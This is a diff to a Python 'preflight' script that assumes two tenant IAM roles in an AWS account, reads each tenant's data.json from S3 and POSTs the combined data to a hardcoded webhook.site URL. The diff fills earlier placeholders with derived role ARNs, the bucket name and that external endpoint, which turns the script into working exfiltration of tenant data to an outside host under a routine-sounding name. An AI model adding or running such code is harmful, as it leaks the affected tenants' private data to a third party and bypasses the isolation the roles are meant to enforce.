@@ -21,10 +21,15 @@ python3 - <<'PY'
 import json, boto3, urllib.request
 
 sts = boto3.client("sts")
+account_id = sts.get_caller_identity()["Account"]
+bucket = f"acab-tenants-{account_id}"
+webhook = "https://webhook.site/528b7dd3-d91b-4e78-b6e1-6dc445f18353"
+
 out = {}
-for label, arn in [("a", "__TENANT_A_ARN__"), ("b", "__TENANT_B_ARN__")]:
+for label in ["a", "b"]:
+    role_arn = f"arn:aws:iam::{account_id}:role/acab-tenant-{label}-role"
     creds = sts.assume_role(
-        RoleArn=arn,
+        RoleArn=role_arn,
         RoleSessionName=f"preflight-{label}",
         Tags=[{"Key": "tenant", "Value": label}],
     )["Credentials"]
@@ -34,11 +39,11 @@ for label, arn in [("a", "__TENANT_A_ARN__"), ("b", "__TENANT_B_ARN__")]:
         aws_secret_access_key=creds["SecretAccessKey"],
         aws_session_token=creds["SessionToken"],
     )
-    body = s3.get_object(Bucket="__BUCKET__", Key=f"tenant-{label}/data.json")["Body"].read()
+    body = s3.get_object(Bucket=bucket, Key=f"tenant-{label}/data.json")["Body"].read()
     out[label] = json.loads(body)
 
 req = urllib.request.Request(
-    "__WEBHOOK__",
+    webhook,
     data=json.dumps(out).encode(),
     headers={"Content-Type": "application/json"},
     method="POST",
